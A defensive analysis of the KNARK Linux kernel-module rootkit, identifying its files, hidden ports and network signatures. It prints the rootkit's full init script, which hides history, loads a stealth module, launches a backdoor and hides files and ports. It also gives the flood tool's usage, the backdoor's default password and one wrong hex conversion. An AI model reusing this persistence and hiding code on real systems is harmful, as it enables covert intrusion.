.. _analysis-knack:

Analysis of the KNARK Rootkit 
=============================

by *Toby Miller*


Purpose
-------

The purpose of this paper is to identify signatures related to the KNARK 
rootkit. This paper does not show how to install the rootkit nor does it 
make any comparisons between this rootkit and other rootkits.  This paper 
will attempt to educate the readers on the various signatures and problems 
related to this rootkit.

What is a rootkit?
------------------

A rootkit is a collection of files/programs used by attacker(s) to re-enter 
a network/computer without being detected.  Normally a rootkit will come 
with various .popular. exploits to assist the attacker in the re-entry of 
a system.  Recently, many of the exploits have been related with common 
vulnerabilities found in BIND, Linux line printer, and Washington 
University.s FTP program. 

In addition to the exploits, many rootkits also come with and install 
sniffers.  This is done because attackers want to capture passwords 
from users logging in over the network; a sniffer can do this and 
it.s quite hard to detect.  A rootkit can also change common binaries 
so that a busy administrator will not detect them.  

Common binaries are binaries that can be used to monitor a systems 
operation.  Some of the common binaries are /bin/ps, /bin/ls, /bin/netstat, 
/usr/bin/lsof and /usr/bin/top (this is not a complete list).  Now 
that we have covered rootkit basics, lets look at the rootkit in question. 

 

The KNARK Rootkit     
-----------------

Recently there has been a lot of talk about the KNARK rootkit on the Incidents 
mailing list and many good references (listed at the end of the paper) are 
coming from the list.  I hope that this paper will provide you with some new 
and useful information.  The KNARK rootkit was sent by a friend (some friend 
huh?!) to look at and analyze.  After unzipping the file, I was presented with 
a bunch of files to look through and analyze.  Table 1 lists the files that come 
with KNARK:

List of files that come with KNARK::
 
    Makefile
    apache.c
    Apache.cgi
     backup
    Bj.c
     caine
    Clearmail  
     dmesg
    Dmsg
     ered
    Exec
     fix
    Fixtext
     ftpt
    Gib
     gib.c
    Hds0
     hidef
    Inc.h
     init
    Lesa
     login
    Lpdx
     lpdx.c
    Make-ssh-host-key
     make-ssh-known-hosts
    Module
     nethide
    Pgr
     removeme
    Rexec
     rkhelp
     sl2
    Sl2.c
     snap
    Ssh_config
     sshd_config
    Ssht
     statdx2
    Sysmod.o
     sz
    T666
     unhidef
    Wugod
     zap

 

After looking through some of the files, I decided to install the rootkit. Knark 
comes with a file named exec  when this file is executed a couple of things take place:

#. Creates the directories: /dev/.pizda and /dev/.pula (will not be able to 
   see using ls. Use cd /dev/.pizda).
#. Inserts sysmod.o. This is the module that allows the rootkit too stay 
   hidden.
#. KNARK also makes changes to the rcx.d S99local file. This causes the 
   machine to fail at boot up. 

 
The first thing I did after installation is pull out NMAP and run 
``nmap -sS -p 1-65535 192.168.0.20`` and waited to see what NMAP had too say.  ::

    Starting nmap V. 2.53 by fyodor@insecure.org ( www.insecure.org/nmap/ )
    Interesting ports on sec-linux.lab.sec (192.168.0.20):
    (The 65523 ports scanned but not shown below are in state: closed)
    Port       State       Service
    21/tcp     open        ftp                     
    79/tcp     open        finger                  
    111/tcp    open        sunrpc                  
    113/tcp    open        auth                    
    512/tcp    open        exec                    
    513/tcp    open        login                   
    514/tcp    open        shell                   
    515/tcp    open        printer                 
    3001/tcp   open        nessusd                 
    18667/tcp  open        unknown                 
    31221/tcp  open        unknown                 
     
    Nmap run completed -- 1 IP address (1 host up) scanned in 33 seconds 

Figure 1. NMAP results

Figure 1 tells us a lot (good thing this box is in a lab and not in the wild : ). 
First, we see that there are two (2) ports that are unknown (18667 and 31221).  
Second, we see that this box is lucky it hasn't been rooted at least a dozen times. 

The next step was to run netstat.  Why?  Well, we want to see if netstat 
will call out the same ports as NMAP.  If netstat does not call out the same 
ports then we check the binary for netstat.::

    Active Internet connections (servers and established)
    Proto Recv-Q Send-Q Local Address           Foreign Address         State      
    tcp        0      0 0.0.0.0:79              0.0.0.0:*               LISTEN      
    tcp        0      0 0.0.0.0:512             0.0.0.0:*               LISTEN      
    tcp        0      0 0.0.0.0:513             0.0.0.0:*               LISTEN      
    tcp        0      0 0.0.0.0:514             0.0.0.0:*               LISTEN      
    tcp        0      0 0.0.0.0:21              0.0.0.0:*               LISTEN      
    tcp        0      0 0.0.0.0:3001            0.0.0.0:*               LISTEN      
    tcp        0      0 0.0.0.0:515             0.0.0.0:*               LISTEN      
    tcp        0      0 0.0.0.0:113             0.0.0.0:*               LISTEN      
    tcp        0      0 0.0.0.0:111             0.0.0.0:*               LISTEN      
    udp        0      0 0.0.0.0:518             0.0.0.0:*                           
    udp        0      0 0.0.0.0:517             0.0.0.0:*                           
    udp        0      0 0.0.0.0:512             0.0.0.0:*                           
    udp        0      0 0.0.0.0:111             0.0.0.0:*                           
    raw        0      0 0.0.0.0:1               0.0.0.0:*                          

    Active UNIX domain sockets (servers and established)
    Proto RefCnt Flags       Type       State         I-Node Path
    unix  0      [ ACC ]     STREAM     LISTENING     468    /dev/printer
    unix  6      [ ]         DGRAM                    371    /dev/log
    unix  0      [ ACC ]     STREAM     LISTENING     503    /dev/gpmctl
    unix  0      [ ACC ]     STREAM     LISTENING     2126   /tmp/.font-unix/fs-1
    unix  0      [ ]         STREAM     CONNECTED     173    @00000015
    unix  0      [ ]         DGRAM                    2711   
    unix  0      [ ]         DGRAM                    2161   
    unix  0      [ ]         DGRAM                    2130   
    unix  0      [ ]         DGRAM                    462    
    unix  0      [ ]         DGRAM                    394    
    unix  0      [ ]         DGRAM                    383    
 

Figure 2: Netstat results

Figure 2 is the results of a ``netstat -a -n``. The output of netstat tells us that 
the two ports were not identified, so off we go to check the netstat binary. 
Checking netstat binary required three steps:

#. Run strings. This allows us to see if there is a hidden directory stored in 
   the binary.  Checked it and there was no hidden directories.
#. Md5sum. This step is common sense. Compared the computers netstat md5sum 
   to a CD's md5sum and no luck!! Both were the same.
#. Run diff. Yes. . . this is redundant but we have nothing to lose and everything 
   to gain. Unfortunately, the result is the same. Everything checks out OK.
#. In the past if a box had a rootkit installed, an administrator could comb 
   through the binaries and find traces of the rootkit. Not so in this case. 
   The KNARK rootkit actually hides within the kernel making this rootkit almost 
   impossible to find and analyze. How is this being done? Well, attackers are able 
   to do this by using Loadable Kernel Modules (LKM). For anybody who has been 
   in the Linux world you know that LKM.s are pieces of code that can be loaded 
   into the operating system on demand. As a matter of fact it is encouraged that you 
   use LKM.s in order to update your hardware for your OS. BTW, inserting modules 
   into Linux is not that difficult, in fact ``insmod -f`` will do the job. 


KNARK comes with some a few good exploits as well. 

#. *Lpdx* - This is used to exploit the LPR service of Red Hat boxes. Here 
   is what a IDS might see:

   Figure 3: Lpr Signature::

      09:06:19.991789 > 192.168.1.13.2894 > 192.168.0.40.printer: S 4221747912:4221747912(0) win 32120 <mss 1460,sackOK,timestamp 4058996 0,nop,wscale 0> (DF) (ttl 64, id 11263)
      09:06:19.993434 < 192.168.1.13.printer > 192.168.0.40.2894: S 397480959:397480959(0) ack 4221747913 win 32120 <mss 1460,sackOK,timestamp 393475 4058996,nop,wscale 0> (DF) (ttl 64, id 3278)
      09:06:19.993514 > 192.168.1.13.2894 > 192.168.0.40.printer: . 1:1(0) ack 1 win 32120 <nop,nop,timestamp 4058996 393475> (DF) (ttl 64, id 11264)

#. *T666* - Used to exploit BIND 8.2.1.  This exploit is used against Linux 
   and FreeBSD.  A common signature of this tool is there is usually a 
   directory called /var/named/ADMROCKS.  

#. *Wugod* - This is an exploit for Washington University.s ftpd 2.6.0(1) 
   for FREEBSD, Linux (RH 6.2 and SuSe 6.3&6.4).

Slice v2.1+, credits: sinkhole, sacred. Rewritten and 1+ by some lamerz :P

### linux version

 

Usage: ./sl2 <target> <clones> [-f] [-c] [-d seconds] [-p packets] [-s packetsize] [-maxs packetsize] [-a srcaddr] [-l lowport] [-h highport] [-incports] [-sleep ms] [-syn[ack]]

    Target      - the target we are trying to attack.

    Clones      - number of packets to send at once (use -f for more than 6).

    -f          - force usage of more than 6 clones.

    -c          - class C flooding.

    -d seconds  - time to flood in seconds (default 600, use 0 for no timeout).

    -p packets  - packets to send for each clone (if used with -d is ignored). 

-s size     - packet size (default 40, use 0 for random packets).

    -maxs size  - maximum size for random packets.

    -a srcaddr  - the spoofed source address (random if not specified).

    -l lowport  - start port (1024 if not specified).

    -h highport - end port (65535 if not specified).

    -incports   - choose ports incremental (random if not specified).

    -sleep ms   - delay between packets in miliseconds (0=no delay by default).

    -syn        - use SYN instead ACK.

    -synack     - use SYN|ACK.
 

Figure 4: Slice (sl2) help output

As we can see this tool does allow an attacker the chance to randomize his | her packet(s).  This will make detecting a little harder.  

 

09:05:26.655215 > 192.168.1.13 > 192.168.0.40: (frag 33252:20@256) [tos 0xe8]  (ttl 255)

09:05:26.655701 > 192.168.1.13 > 192.168.0.40: (frag 33252:20@256) [tos 0xe8]  (ttl 255)

09:05:26.656186 > 192.168.1.13 > 192.168.0.40: (frag 33252:20@256) [tos 0xe8]  (ttl 255)

09:05:26.656671 > 192.168.1.13 > 192.168.0.40: (frag 33252:20@256) [tos 0xe8]  (ttl 255)

09:05:26.657156 > 192.168.1.13 > 192.168.0.40: (frag 33252:20@256) [tos 0xe8]  (ttl 255)

09:05:26.657642 > 192.168.1.13 > 192.168.0.40: (frag 33252:20@256) [tos 0xe8]  (ttl 255)

 
 

Figure 5: Results of Slice

Looking at the help command will not assist us in detecting this program, so I decided to run the DOS.  Figure 5 shows us what slice looks like when it is ran.  Keep in mind that these signatures can change (this depends on the attacker and how the rootkit is installed).

     KNARK comes with many other tools that we have not discussed yet.  The first tool we will cover is gib.c.  This tool listens on port 18667 (takes care of one of the two ports we discovered using NMAP) and comes with a by default it has a password of Error and a ps of updated.  This program is just your typical .backdoor. program.  Next, we have a file called init.  This is a shell script BUT, it explains why this root kit is hard to detect. 

 

#!/bin/sh

unset HISTFILE

export HISTFILE=/dev/null

unset _

/sbin/insmod -f /lib/modules/sysmod.o 1>/dev/null 2>/dev/null

if [ -a /usr/bin/gib ]

then

/usr/bin/gib & 1>/dev/null 2>/dev/null

else

echo "aaa" >>/dev/null

fi

/dev/.pizda/jesuscd -f /dev/.pizda/sshd_config -h /dev/.pizda/ssh_host_key -q 1>/dev/null 2>/dev/null

cd "/dev/.pula" 1>/dev/null 2>/dev/null

./caine >> bashina & 1>/dev/null 2>/dev/null

cd /root

killall -31 gib 1>/dev/null 2>/dev/null

killall -31 jesuscd 1>/dev/null 2>/dev/null

killall -31 caine 1>/dev/null 2>/dev/null

/dev/.pizda/hidef /dev/.pizda 1>/dev/null 2>/dev/null

/dev/.pizda/hidef /dev/.pula 1>/dev/null 2>/dev/null

/dev/.pizda/nethide ":79F5" 1>/dev/null 2>/dev/null

/dev/.pizda/nethide ":48EB" 1>/dev/null 2>/dev/null

/dev/.pizda/nethide ":2FB5" 1>/dev/null 2>/dev/null

/dev/.pizda/nethide ":1A01" 1>/dev/null 2>/dev/null

/dev/.pizda/nethide ":1A02" 1>/dev/null 2>/dev/null

/dev/.pizda/nethide ":1A03" 1>/dev/null 2>/dev/null

/dev/.pizda/nethide ":1A04" 1>/dev/null 2>/dev/null

/dev/.pizda/nethide ":1A05" 1>/dev/null 2>/dev/null

/dev/.pizda/nethide ":1A06" 1>/dev/null 2>/dev/null

/dev/.pizda/nethide ":1A07" 1>/dev/null 2>/dev/null

/dev/.pizda/nethide ":1A08" 1>/dev/null 2>/dev/null

/dev/.pizda/nethide ":1A09" 1>/dev/null 2>/dev/null

/dev/.pizda/nethide ":1A0A" 1>/dev/null 2>/dev/null

/dev/.pizda/nethide ":1A0B" 1>/dev/null 2>/dev/null

/dev/.pizda/nethide ":1A0C" 1>/dev/null 2>/dev/null

/dev/.pizda/nethide ":1A0D" 1>/dev/null 2>/dev/null

/dev/.pizda/nethide ":1A0E" 1>/dev/null 2>/dev/null

/dev/.pizda/nethide ":1A0F" 1>/dev/null 2>/dev/null

/dev/.pizda/nethide ":029A" 1>/dev/null 2>/dev/null

/dev/.pizda/hidef /usr/bin/gib 1>/dev/null 2>/dev/null

/dev/.pizda/hidef /bin/rtty 1>/dev/null 2>/dev/null

/dev/.pizda/hidef /tmp/pgr 1>/dev/null 2>/dev/null

/dev/.pizda/hidef /var/lock/pgr 1>/dev/null 2>/dev/null

/dev/.pizda/hidef /usr/man/man3/pgr 1>/dev/null 2>/dev/null

/dev/.pizda/hidef /lib/modules/sysmod.o 1>/dev/null 2>/dev/null

/dev/.pizda/hidef /sbin/rootme 1>/dev/null 2>/dev/null

if [ -a /var/spool/uucp/zdn ]

then

/dev/.pizda/hidef /var/spool/uucp/zdn 1>/dev/null 2>/dev/null

 
 

Figure 6: init file

Figure 6 explains everything.  I would like to point out a few important lines in this script.

1)     You can see where the attacker uses insmod .f to install sysmod.o.  Again, this allows the attacker to remain hidden.

2)     He uses killall .31 to hide gib, jessuscd and caine. In order to make them viewable you would have to enter killall .32(There is a link at the bottom of this paper that explains this concept in much more detail.).    

3)     You see many references to /dev/.pizda/nethide. An example is:

/dev/.pizda/nethide ":79F5" 1>/dev/null 2>/dev/null.

 

Well, for all who don.t have enough time to do hex conversions here are the hex to decimal conversions:

48EB = 18667                         1A05 = 6661

79F5 = 31221                         1A06 = 6662

029A = 12213                         1A07 = 6663

1A01 = 6657                     1A08 = 6664

1A02 = 6658                     1A09 = 6665

1A03 = 6659                     1A0A = 6666

1A04 = 6660                     1A0B = 6667

1A0C = 6668                     1A0D = 6669

1A0E = 6670                     1A0F = 6671

Recommendations

To be honest, I have not had enough time to come up with solid solutions related to LKM rootkits.  I did come up with a few that might help.  The first is to run LIDS.  I have not tested LIDS, but I plan to test in the near future.  Second, if you come across a LKM rootkit and you cannot find anything (changed binaries etc..) try upgrading your version(providing your not worried about evidence).  Upgrading won.t remove the rootkit but it should allow you to see what exactly was going on. 

Conclusion

This type of rootkit goes against everything Security Administrators were ever taught.  In the past, rootkits  would hide their tracks by replacing binaries.  Administrators would use known good binaries to find the kits and that was that. With this beast it.s not that simple and neither is the solution.   


